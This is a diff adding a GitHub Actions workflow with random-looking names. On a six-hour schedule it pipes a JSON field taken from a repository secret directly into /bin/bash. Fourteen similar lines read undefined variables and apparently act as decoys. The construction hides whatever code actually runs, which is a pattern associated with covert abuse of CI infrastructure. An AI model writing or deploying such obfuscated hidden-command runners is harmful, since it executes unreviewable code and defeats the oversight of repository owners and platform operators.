@@ -1,0 +1,32 @@
+name: yijushuobing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yijushuobing
+        env:
+          amqya856: ${{ secrets.amqya856 }}
+        run: |
+          echo $amqya856 | jq -r .lkfh74631 | /bin/bash
+          echo $zin47243 | jq -r .qmggn54 | /bin/bash
+          echo $p1 | jq -r .vn0 | /bin/bash
+          echo $doph7 | jq -r .famp88 | /bin/bash
+          echo $m66043 | jq -r .bm330 | /bin/bash
+          echo $tvuv8 | jq -r .u73 | /bin/bash
+          echo $fuh38 | jq -r .xmn097 | /bin/bash
+          echo $myiwn0 | jq -r .tibxs8313 | /bin/bash
+          echo $xc7768 | jq -r .w6814 | /bin/bash
+          echo $tsl832 | jq -r .otp6861 | /bin/bash
+          echo $gpip25069 | jq -r .xddtj9 | /bin/bash
+          echo $gfou9706 | jq -r .xxvnd4875 | /bin/bash
+          echo $mtb41643 | jq -r .rxg981 | /bin/bash
+          echo $wexc3 | jq -r .csfl966 | /bin/bash
+          echo $acv829 | jq -r .slfod8331 | /bin/bash
+
